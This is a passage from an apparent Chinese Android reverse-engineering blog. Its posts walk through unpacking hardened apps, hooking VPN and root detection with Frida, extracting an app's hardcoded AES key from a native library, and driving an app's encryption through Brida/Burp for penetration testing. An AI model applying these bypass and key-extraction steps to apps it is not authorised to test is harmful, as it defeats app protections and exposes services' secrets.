alt="我们可以看到直接hook成功能"></p><li>我们进一步分析下这个检测函数。用jadx打开app。静态分析一下。一看app被加固了。这个360加固我们常规用frida-dexdump blackdex 进行脱壳。但是经过我测试。这两个都没有脱掉壳。这个壳子升级了。那我们只好祭出。我们修改过的脱壳系统。成功脱掉</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306020957949.png" alt="360加固"></p></ul><h2 id="分析app"><a href="#分析app" class="headerlink" title="分析app"></a>分析app</h2><ul><li>把脱壳后的zip文件放到jadx里面。由于jadx 反编译不出vpn检测代码我们用jeb进行反编译。我把完整检测代码放出来为了进一步了解是如何检测的。为了保护程序。部分关键代码替换。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021001833.png" alt="检测函数"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021002107.png" alt="vpn检测"></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>zzzzz<span class="token punctuation">.</span>lib_common<span class="token punctuation">.</span>utils</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>content<span class="token punctuation">.</span></span><span class="token class-name">Context</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">ConnectivityManager</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span><span class="token class-name">TextUtils</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>zzzzz<span class="token punctuation">.</span>lib_common<span class="token punctuation">.</span>constant<span class="token punctuation">.</span></span><span class="token class-name">CommonConstant</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">NetworkInterface</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">SocketException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Collections</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Iterator</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">timber<span class="token punctuation">.</span>log<span class="token punctuation">.</span></span><span class="token class-name">Timber</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CheckDevice</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isVpnUsed</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Iterator</span> v0_1<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"com.zzzzz.shenji"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">CommonConstant</span><span class="token punctuation">.</span>PACKAGE_NAME<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            v0_1 <span class="token operator">=</span> <span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">list</span><span class="token punctuation">(</span><span class="token class-name">NetworkInterface</span><span class="token punctuation">.</span><span class="token function">getNetworkInterfaces</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">SocketException</span> v0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            v0<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">String</span> v2 <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            label_10<span class="token operator">:</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>v0_1<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token class-name">Object</span> v3 <span class="token operator">=</span> v0_1<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">NetworkInterface</span> v3_1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">NetworkInterface</span><span class="token punctuation">)</span>v3<span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>v3_1<span class="token punctuation">.</span><span class="token function">isUp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    v2 <span class="token operator">=</span> v3_1<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//hook点</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>v2<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"tun"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>v2<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"ppp"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>v2<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"pptp"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">goto</span> label_10<span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token class-name">Timber</span><span class="token punctuation">.</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token string">"VPNname %s"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>v2<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">SocketException</span> v0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">&#125;</span>        v0<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isWifiProxy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"com.zzzzz.shenji"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">CommonConstant</span><span class="token punctuation">.</span>PACKAGE_NAME<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">String</span> v0 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"http.proxyHost"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> v2 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"http.proxyPort"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>v2 <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            v2 <span class="token operator">=</span> <span class="token string">"-1"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">Timber</span><span class="token punctuation">.</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token string">"代理proxyAddress %s"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>v0<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Timber</span><span class="token punctuation">.</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token string">"代理proxyPort %s"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">!</span><span class="token class-name">TextUtils</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>v0<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">vpnnetworkCheck</span><span class="token punctuation">(</span><span class="token class-name">Context</span> arg2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"com.zzzzz.shenji"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">CommonConstant</span><span class="token punctuation">.</span>PACKAGE_NAME<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">ConnectivityManager</span> v2_1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ConnectivityManager</span><span class="token punctuation">)</span>arg2<span class="token punctuation">.</span><span class="token function">getSystemService</span><span class="token punctuation">(</span><span class="token string">"connectivity"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> v2_1<span class="token punctuation">.</span><span class="token function">getNetworkCapabilities</span><span class="token punctuation">(</span>v2_1<span class="token punctuation">.</span><span class="token function">getActiveNetwork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasTransport</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> v2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            v2<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></ul><h2 id="定位弹窗"><a href="#定位弹窗" class="headerlink" title="定位弹窗"></a>定位弹窗</h2><ul><li>上一步我们分析了检测代码我们这来分析这个弹窗如何hook分析一下代码。查找。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021008821.png"></p><li>看到了检测点。由于这是表面所以我们要深入进行分析分析调用逻辑。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021009938.png"></p><li>下图调用这个setMessage  返回是他自己定义类那我们只有。从函数参数入手来定位了。发现是这个 this.binding.textContent.setText(charSequence); 。我们看 追踪到  public final TextView textContent; 可以看到import android.widget.TextView;这个属于安卓的那我们就hook这个看看</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021012166.png"></p><li>hook关键函数。我们hook到了。这个代码你们自己写就行了。我就不放了。到这里我们已经搞定抓包了。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021016586.png"></p></ul><h2 id="算法定位"><a href="#算法定位" class="headerlink" title="算法定位"></a>算法定位</h2><ul><li>来到登陆界面点击登陆抓包。咋眼一看。这和md5类似。掏出我们的算法通杀脚本进行。hook发现hook不到</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021021011.png"></p><li>放大招了我们祭出我自己总结的hook脚本来hook一下。hook到了。自己写的果然是比较不错哈哈哈。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021024412.png"></p><li>看了一下在标准md5得到结果以后对结果进行加工了一下。难怪hook不到。。。。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021026252.png" alt="截图"></p></ul><h2 id="hookvpn脚本下载"><a href="#hookvpn脚本下载" class="headerlink" title="hookvpn脚本下载"></a>hookvpn脚本下载</h2><ul><li>分析到这里就分析完了。下载地址:https://t.me/SoftwareUpdateChannel/196</li></ul>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某颜色app抖阴加密算法分析-过root检测和so层初探</title>
      <link href="/androidreverse/2023/04/articles/c46552d11b0f0c1d/"/>
      <url>/androidreverse/2023/04/articles/c46552d11b0f0c1d/</url>
      
        <content type="html"><![CDATA[<h2 id="app样本"><a href="#app样本" class="headerlink" title="app样本"></a>app样本</h2><ul><li>闲来无事搞一个app,不知道找啥目标搞。结果翻着翻着找到今天的主角那就搞它了。传说中的和抖音同名的抖阴app。常规操作下载app安装打开。介于这个app是有颜色的所以本次全部不打码直接搞。</li></ul><h2 id="过root检测"><a href="#过root检测" class="headerlink" title="过root检测"></a>过root检测</h2><ul><li>打开app一看这个提示这我的暴脾气能忍么。检测到手机root。。说我使用的模拟器或者设备已经被root了。<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281431776.png" alt="检测到手机root"></p></li><li>首先拖到jadx看看是否加壳。发现没有被加壳。但是app混淆了。握擦这防护的这么流弊么</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281435765.png" alt="混淆截图"></p><li>首先开启我们的firda看看这货检测不检查frida什么的。发现不检查。这小子还算识相。这时候我们想到可以用objection 的disable root来干掉root检测。但是也有可能干不掉。如果app检测root手段比较全面呢。所以我们用自己写的firda root检测定位脚本来测试一下</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281437899.png" alt="没有检测frida"></p><li>用自己写的root定位检测脚本来看看。这样hook 。然后点击确定。进程没有退出我们已经hook了。然后在打开app看操作</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281440654.png" alt="hook截图"></p><li>打开app看看是否触发了root检测脚本。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281442634.png" alt="检测点在"></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">at java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>File<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span>Native Method<span class="token punctuation">)</span>   at com<span class="token punctuation">.</span>blankj<span class="token punctuation">.</span>utilcode<span class="token punctuation">.</span>util<span class="token punctuation">.</span>w<span class="token punctuation">.</span><span class="token function">q</span><span class="token punctuation">(</span>DeviceUtils<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">3</span><span class="token punctuation">)</span>   at com<span class="token punctuation">.</span>niming<span class="token punctuation">.</span>weipa<span class="token punctuation">.</span>ui<span class="token punctuation">.</span>splash<span class="token punctuation">.</span>SplashActivity<span class="token punctuation">.</span><span class="token constant">A</span><span class="token punctuation">(</span>SplashActivity<span class="token punctuation">.</span>kt<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">)</span>   at com<span class="token punctuation">.</span>niming<span class="token punctuation">.</span>weipa<span class="token punctuation">.</span>ui<span class="token punctuation">.</span>splash<span class="token punctuation">.</span>SplashActivity<span class="token punctuation">.</span><span class="token constant">K</span><span class="token punctuation">(</span>SplashActivity<span class="token punctuation">.</span>kt<span class="token operator">:</span><span class="token number">3</span><span class="token punctuation">)</span>   at com<span class="token punctuation">.</span>niming<span class="token punctuation">.</span>weipa<span class="token punctuation">.</span>ui<span class="token punctuation">.</span>splash<span class="token punctuation">.</span>SplashActivity<span class="token punctuation">.</span><span class="token function">initView</span><span class="token punctuation">(</span>SplashActivity<span class="token punctuation">.</span>kt<span class="token operator">:</span></code></pre><li>接下来分析一波这个函数。当然这里已经进去系统了已经过掉了root检测了。当然如果没有过掉那么你分析一下这个检测函数被谁调用一级一级推断最后找到总检测函数直接hook掉就行了</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281446178.png" alt="检测点"></p></ul><h2 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h2><ul><li>抓包发现三处加密</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281529668.png" alt="请求加密的截图">)</p><li>分析请求头肯定是有hashmap 这种keyvalue的形式。和hook java bytes字节的方式。所以我们直接hook这种掏出我们的写的js脚本神器hook。直接拿捏定位。 com.niming.weipa.utils.b.b  com.niming.weipa.utils.b.a  猜测是aes加密算法</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281454667.png" alt="hook定位1"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281458394.png" alt="hook定位2"></p><li>根据定位反推一下上一层函数。发现和我们请求包的函数一样。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281459582.png" alt="上层函数位置"></p><li>看代码。重点分析一下。f5317d 应该就是秘钥了。当然你直接hook秘钥也行。我们看这个他代码的意思是如果是release debug key就取TestUtil.getSecret2(); 否则是 如果是"release", "staging 取这个TestUtil.getSecretPre() 否则就是取这个 TestUtil.getSecret();。最终是取了TestUtil.getSecret();。这里需要java 基础和安卓的函数基础如果不知道的可以hook看看</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281502758.png" alt="加密代码分析"></p><li>我们重点看TestUtil.getSecret(); 里面的这个函数。我们发现这个是native函数(一般这代码大部分在so文件里面)又发现采用静态加载方式System.loadLibrary("security");  那在lib目录表现形式是libsecurity.so所以我们找这个so曾经就行 </li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281507988.png" alt="native函数"></p><li>分析一下这个libsecurity.so   getSecret 函数一般在so文件表现形式是java全包名和函数名称以_连接。并且在导出表里面。具体看截图。我们看。32位的so文件用32位的ida打开。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281511727.png" alt="32位so曾经"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281513946.png" alt="函数位置"></p><li>看函数的逻辑。我们看到返回一个字符串这就是key了 l8N2iooyp07M9IWa 填充方式加密模式 AES/ECB/PKCS7Padding,</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281514193.png" alt="so层函数"></p></ul><h2 id="验证和总结"><a href="#验证和总结" class="headerlink" title="验证和总结"></a>验证和总结</h2><ul><li>验证是否正确解密一下看看。其他三处也是同样方式</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281517193.png" alt="成功解密"></p><li>总结要想理解今天的文章。需要动java基础 和java函数在so文件中如何调用如果并且使用的。函数的注册方式静态注册和动态注册等主要system.load 这个函数的函数并不一定就在这个so文件里面可能是个假的 so。通过动态方式注册的。本文恰好就在。要想在so层逆向中牛逼必要的c++和汇编和ida这些知识要学习的。</li></ul>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某了app非标准base64算法无壳算法混淆brida渗透测试案例</title>
      <link href="/androidreverse/2023/04/articles/a2e5bddade12ebbb/"/>
      <url>/androidreverse/2023/04/articles/a2e5bddade12ebbb/</url>
      
        <content type="html"><![CDATA[<h2 id="brida介绍"><a href="#brida介绍" class="headerlink" title="brida介绍"></a>brida介绍</h2><ul><li>Brida 是 Burp 中的一个插件，它可以把app 和Frida  和  Burp结合起来使用，简化测试流程，通过 Brida 能在 Burp 中直接调用目标 app 中的加 / 解密函数。对app进行测试适用于无法或者复现难度较大的算法。比如本次的案例。</li></ul><h2 id="app测试流程"><a href="#app测试流程" class="headerlink" title="app测试流程"></a>app测试流程</h2><ul><li>(1)拿到一个app先安装</li><li>(2)安装完毕以后抓包,用到的工具(postern + Charles) </li><li>(3)抓包分析算法定位(查壳,脱壳,hook,jadx 反编译,jeb工具,frida) </li><li>(4)编写hook脚本(implemention ) </li><li>(5)深度分析加密算法流程</li><li>(6)编写主动调用算法脚本并且测试</li><li>(7)在brida中编写测试js脚本(这里用到主动调用脚本)</li><li>(8)在brida中测试加密解密函数</li><li>(9)在brida中编写 handler  Request ,response 脚本</li><li>(10)请求包中使用明文,响应包中密文进行测试。最终用brup进行渗透测试</li><li>总结:要搞好安卓逆向需要学习的是java基础,渗透测试技术,JavaScript 语法 ,frida语法基础,,汇编二进制逆向(这个渗透测试不需要掌握太猛)。这些是必要条件。最后的一条不需要太厉害懂点就行了除非你是专业逆向人员。</li></ul><h2 id="测试案例app某了分析加密解密结果"><a href="#测试案例app某了分析加密解密结果" class="headerlink" title="测试案例app某了分析加密解密结果"></a>测试案例app某了分析加密解密结果</h2><ul><li>至于如何进行app测试参照上面的流程演示的是某聊天app</li><li>抓包有三处加密请求有两处。响应有一处。总共三处</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191535112.png" alt="抓包"></p><li>看到这里立马会想到用bytes字节函数进行定位说干就干。启动frida 。搞一波我们的脚本直接定位  b.o.a.h.b$e.h      b.o.a.c.b.h.intercept   两个可疑点    </li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191544208.png" alt="直接定位"><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191548639.png" alt="两个可疑点"></p><li>那我们用jadx反编译一下看看这个类b.o.a.h.b。我们看请求包里面有data 有encrypt 关键字肯定就是这里了 </li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191643023.png" alt="反编译查壳关键类"></p><li>点进去第一个看看。这个意思是把这些数据转换成json然后进行加密</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191647334.png" alt="确定加密算法"></p><li>定位加密函数 f 我们hook一下这个函数</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191654493.png" alt="加密"></p><li>hook出加密前的东东了</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191656304.png" alt="加密前"></p><li>找找响应包堆栈定位一波看看。发现啥都没有。在看看请求是okhttp3。我们直接用ok3定位一下</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191704813.png" alt="发现啥都没有"></p><li>直接用okhttp3直接定位</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191709715.png" alt="直接定位"></p><li>通过分析到下图。点进去看看<li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191711414.png" alt="分析得到结果"></p><li>得到解密函数。下来编写hook进行验证。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191712761.png" alt="解密函数"></p><li>编写frida hook脚本验证测试结果。验证成功</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191714394.png" alt="加密解密函数验证"></p><li>编写主动调用加密解密函数这需要java基础才可以</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191719701.png" alt="验证成功成功解密"></p></ul><h2 id="brida脚本编写插件配置实现自动化加密加密"><a href="#brida脚本编写插件配置实现自动化加密加密" class="headerlink" title="brida脚本编写插件配置实现自动化加密加密"></a>brida脚本编写插件配置实现自动化加密加密</h2><ul><li>我看分析了一下发现加密解密函数调用码表是猜测是base64算法但是魔改的。由于混淆比较严重编程功力的问题。我们选择神器brida来进行测试。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191722801.png" alt="码表"></p><li>配置brida环境什么的参考网络上这里直接进行实战配置。使用Charles 转发请求到bp</li><p><img src="https://raw.githubusercontent.com/peiqiF4ck/mybologimg/main/img/202304191730656.png" alt="bp请求包"></p><li>启动brida</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191735701.png" alt="brida启动界面"></p><li>编写脚本brida脚本。调用测试。测试成功</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191739064.png" alt="编写brida脚本"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191743861.png" alt="测试brida脚本"></p><li>接下来就是重点了 编写联动插件函数了。由于篇幅太长我就不演示如何编写了可以参考bi站文章或者后续加入内部群</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191746938.png" alt="插件编写"></p><li>测试成功</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191801076.png" alt="明文请求了"></p></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>关键是有java编程基础和frida使用基础和正则表达式编写基础才可以达到这个程度!!!</li></ul>s]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
            <tag> PenetrationTest </tag>
            
            <tag> Brida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某app绕过root检测分享-几维加固</title>
      <link href="/androidreverse/2023/04/articles/6163f59aa1645267/"/>
      <url>/androidreverse/2023/04/articles/6163f59aa1645267/</url>
      
        <content type="html"><![CDATA[<h2 id="几维加固"><a href="#几维加固" class="headerlink" title="几维加固"></a>几维加固</h2><ul><li>动应用加固系统是一款针对APK文件的自动化安全加固产品，可以提高应用程序的代码安全性、数据安全性和自主防御能力，并且符合《GBT25070-2019信息安全技术网络安全等级保护安全设计技术要求》【简称:等保 2.0】中的移动互联安全计算环境设计技术要求。可以帮助金融、手游、电商、社交等行业解决移动应用的诸多安全问题，包括核心代码被反编译、应用被仿冒、API 接口暴露、密钥被窃取、请求协议被伪造，APK 包被植入恶意代码等，提供全面的标准化安全保护功能。<p>用户只需要提供APK包即可快速集成防静态工具分析、Dex 文件保护、So 文件保护、内存保护、反调试、防二次打包、本地数据加密、资源文件加密等多项安全功能。</p></li></ul><h2 id="app分析"><a href="#app分析" class="headerlink" title="app分析"></a>app分析</h2><ul><li>使用市面上的查壳工具出不出什么壳子。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304181545045.png" alt="用jadx打开就一个类"></p><li>使用工具查壳信息https://github.com/horsicq/XAPKDetector 也查不出什么壳子。这个工具可以看详情啥的。最后利用MT工具查出的壳子是几维安全的壳子。由于刚搞app这个壳子完全没有听过。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304181558019.png" alt="几维安全"></p><li>打开app正要抓包的时候弹出一个提示说设备以及root。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304181601981.png" alt="提示设备已经root"></p><li>这时候的想法是我们拿出我们的神器frida 在拿出我们的hookroot的脚本搞他。或者是用objection 搞说干就干frida报错了 Failed to attach: unexpected error while attaching to process with pid 19517 